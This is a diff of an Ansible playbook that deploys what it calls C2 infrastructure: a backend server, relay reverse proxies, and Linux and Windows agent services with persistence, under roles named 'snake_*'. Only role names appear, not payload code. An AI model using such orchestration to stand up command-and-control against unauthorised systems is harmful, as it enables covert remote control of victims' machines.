@@ -1,23 +1,34 @@
 ---
-# First, update networking and certs on everything
-- hosts: all
-  become: true # Needed for root permission (except on Windows SYSTEM)
+- name: Apply Network Configuration
+  hosts: all
+  gather_facts: true
+  become: true
   roles:
     - common_net
 
-# Deploy the C2 Core (server.py, index.html)
-- hosts: backend
+- name: Deploy Snake Eyes Backend
+  hosts: backend
+  gather_facts: true
   become: true
   roles:
     - snake_server
 
-# Configure the 10 Reverse Proxies
-- hosts: relays
+- name: Deploy C2 Relay Servers
+  hosts: relays
+  gather_facts: true
   become: true
   roles:
     - snake_relay
 
-# Deploy the Agents and Persistence
-- hosts: agents
+- name: Deploy Linux Agent Service
+  hosts: linux_agents
+  gather_facts: true
+  become: true
   roles:
-    - snake_agent
+    - snake_agent_linux
+
+- name: Deploy Windows Agent Service
+  hosts: windows_agents:windows_dns_agents
+  gather_facts: true
+  roles:
+    - snake_agent_windows
